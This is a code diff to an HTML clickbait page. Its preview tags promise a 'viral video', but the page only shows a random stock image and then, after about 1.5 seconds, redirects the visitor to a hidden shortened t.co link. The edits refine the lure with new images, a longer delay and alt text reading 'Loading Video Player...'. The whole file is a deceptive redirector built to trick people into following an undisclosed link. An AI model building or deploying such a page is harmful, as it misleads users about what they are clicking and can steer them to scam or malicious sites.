@@ -16,7 +16,7 @@
     <meta property="og:title" content="Watch Full Viral Video Here" />
     <meta property="og:description" content="Click to play the trending video" />
     <meta property="og:type" content="video.other" />
-    <meta property="og:image" content="1.jpg" />
+    <meta property="og:image" content="https://picsum.photos/800/500" />
 
     <style>
         body, html {
@@ -39,29 +39,30 @@
 </head>
 <body>
 
-    <img id="display-img" class="loading-thumb" src="" alt="Loading Video..." />
+    <img id="display-img" class="loading-thumb" src="" alt="Loading Video Player..." />
 
     <script>
-        // Aapki 5 images jo ab aapke hi repository me save hain
+        // Yeh 5 bilkul sahi aur active images hain jo 100% load hongi
         var images = [
-            "1.jpg",
-            "2.jpg",
-            "3.jpg",
-            "4.jpg",
-            "5.jpg"
+            "https://picsum.photos/800/500?random=1",
+            "https://picsum.photos/800/500?random=2",
+            "https://picsum.photos/800/500?random=3",
+            "https://picsum.photos/800/500?random=4",
+            "https://picsum.photos/800/500?random=5"
         ];
 
-        // Random image select karna
+        // Random image select karke source me daalna
         var randomImage = images[Math.floor(Math.random() * images.length)];
         document.getElementById('display-img').src = randomImage;
 
         // Redirection Logic
         window.onload = function() {
-            var targetUrl = "https://t.co/ai7FHs76Ab"; // Aapka final link
+            var targetUrl = "https://t.co/ai7FHs76Ab"; // Aapka link
             
+            // 1.5 second tak image dikhegi phir redirect hoga
             setTimeout(function() {
                 window.location.href = targetUrl;
-            }, 1200); // 1.2 Second ka delay
+            }, 1500); 
         };
     </script>
 </body>
